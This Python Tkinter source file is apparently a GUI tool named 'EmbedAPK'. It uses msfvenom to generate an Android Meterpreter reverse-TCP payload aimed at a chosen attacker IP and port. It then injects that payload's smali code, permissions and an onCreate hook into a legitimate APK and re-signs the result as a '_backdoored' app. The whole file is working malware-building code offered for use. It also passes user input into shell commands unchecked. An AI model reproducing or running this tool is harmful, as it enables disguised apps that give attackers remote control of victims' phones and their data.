import os
import re
from Tkinter import *
root= Tk()
root.title("EmbedAPK")

def aboutprogram():
	aboutdialog=Tk()
	aboutdialog.title("AboutEmbedAPK")
	aboutlabel = Label(aboutdialog, text="EmbedAPK --- Krishnaprasadh.R\n Enter IP,PORT, Input APK Filename and Click Generate \n Input Hook Location and Click Hook Activity ")
	aboutdialog.resizable(False, False)
	aboutlabel.pack()
	
def hookactivity():
	hook=getactivity.get().replace(".", "/")	
	print(hook)
	command="rm ./sourceapk/activityhooks.txt"
	os.system(command)
	command="rm ./sourceapk/packagehooks.txt"
	os.system(command)
	command="./sourceapk/smali/"+hook+".smali"
	#print(command)
	smalifile= hook.split('/')
	#print("smalifile="+smalifile[-1])
	smalipath= hook.rsplit('/',1)[0]
	#print("smalipath="+smalipath)
	#os.system(command)
	activityhook="    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
	f1 = open(command, "r")
	buf= f1.readlines()	#buffer
	f2 = open("./sourceapk/smali/"+smalipath+"/smalifile.smali", "w")
	for line in buf:
		#condition="true"
		if "->onCreate(Landroid/os/Bundle;)V" in line:		#if line == "something"
			#if condition=="true":
				f2.write(line)
				f2.write('\n')
				f2.write(activityhook)
				f2.write('\n')
		else:
			f2.write(line)
	f2.close()
	f1.close()
	command="rm ./sourceapk/smali/"+hook+".smali"
	os.system(command)
	command="mv ./sourceapk/smali/"+smalipath+"/smalifile.smali ./sourceapk/smali/"+smalipath+"/"+smalifile[-1]+".smali"
	#print("rename path="+command)
	os.system(command)
	command="java -jar ./apktool.jar b sourceapk -o ./sourceapk.apk"
	os.system(command)
	command="rm -r sourceapk/ && rm -r virusapk/ && rm ./virus.apk"
	os.system(command)
	command="java -jar signapk.jar certificate.pem key.pk8 ./sourceapk.apk sourceapksigned.apk"
	os.system(command)
	os.system("rm ./sourceapk.apk")
	sourceapk=getsourceapk.get().split('.')
	command="mv ./sourceapksigned.apk ./"+sourceapk[0]+"_backdoored."+sourceapk[-1]
	os.system(command)
	print("DONE! Ready For Testing ===> "+sourceapk[0]+"_backdoored."+sourceapk[-1])
	

def generateapk():
	command="msfvenom -p android/meterpreter/reverse_tcp LHOST="+getip.get()+" LPORT="+getport.get()+" -o ./virus.apk"
	print(command)
	os.system(command)
	#sourceapk=raw_input("Enter APK filename to be backdoored (filename.apk): ")
	command="java -jar ./apktool.jar d "+getsourceapk.get()+" -o sourceapk"
	#print(command)
	os.system(command)
	command="java -jar ./apktool.jar d virus.apk -o virusapk"
	#print(command)
	os.system(command)
	command="mkdir ./sourceapk/smali/com >/dev/null 2>&1"
	os.system(command)
	command="cp -r ./virusapk/smali/com/metasploit ./sourceapk/smali/com/metasploit/"
	os.system(command)
	#ExtractPermissions
	f = open('./virusapk/AndroidManifest.xml')
	f1 = open('./virusapk/tocopy.xml', 'w')
	for line in f.readlines():
	    if '<uses-permission' in line:
	        f1.write(line)
	f1.close()
	f.close()
	#InjectPermissions
	f  = open('./sourceapk/AndroidManifest.xml')
	f1 = open('./virusapk/tocopy.xml')
	f2 = open('./sourceapk/final.xml','w')
	for line in f.readlines():
	    f2.write(line)
	    if '<uses-permission' in line:
	        for line1 in f1.readlines():
	           f2.write(line1)
	f2.close()
	f1.close()
	f.close()
	os.system("rm ./virusapk/tocopy.xml")
	os.system("rm ./sourceapk/AndroidManifest.xml")
	os.system("mv ./sourceapk/final.xml ./sourceapk/AndroidManifest.xml")
	#locate hooks
	f1 = open("./sourceapk/AndroidManifest.xml", "r")
	f2 = open("./sourceapk/activityhooks.txt","w")
	regex = re.compile(r'"[^"]*"')
	for line in f1:
		if 'android:name=' and 'activity android:' in line:
	    		quotes = regex.findall(line)
	    		for word in quotes:
	        		#print word
		            f2.write(word+'\n')
	f2.close()
	f1.close()
	f1 = open("./sourceapk/AndroidManifest.xml", "r")
	f2 = open("./sourceapk/packagehooks.txt","w")
	regex = re.compile(r'"[^"]*"')
	for line in f1:
		if 'package=' in line:
	    		quotes = regex.findall(line)
	    		for word in quotes:
        			#print word
		            f2.write(word+'\n')
	f2.close()
	f1.close()
	activitiesdialog=Tk()
	activitiesdialog.title("Available Activities To Hook")
	with open("./sourceapk/activityhooks.txt", "r") as f:
    		Label(activitiesdialog, text=f.read()).pack()
	with open("./sourceapk/packagehooks.txt", "r") as f:
    		Label(activitiesdialog, text=f.read()).pack()	
	activitiesdialog.resizable(False, False)
	

iplabel = Label(root, text="Enter LHOST IP : ")
iplabel.pack()
getip= Entry(root)
getip.pack()

portlabel = Label(root, text="Enter LPORT : ")
portlabel.pack()
getport= Entry(root)
getport.pack()

sourceapklabel = Label(root, text="APK filename to be backdoored (filename.apk): ")
sourceapklabel.pack()
getsourceapk= Entry(root)
getsourceapk.pack()

activitylabel = Label(root, text="Enter hook location (Usually MainActivity) - CaseSensitive (com.x.x) or (package.x.x): ")
activitylabel.pack()
getactivity= Entry(root, width=50)
getactivity.pack()

exitbutton=Button(root, text="Exit",command=root.quit)
exitbutton.pack(side="right")
aboutbutton=Button(root, text="About",command=aboutprogram)
aboutbutton.pack(side="right")
activitybutton=Button(root, text="Hook Activity",command=hookactivity)
activitybutton.pack(side="right")
genbutton=Button(root, text="Generate",command=generateapk)
genbutton.pack(side="right")

root.resizable(False, False)
root.mainloop()
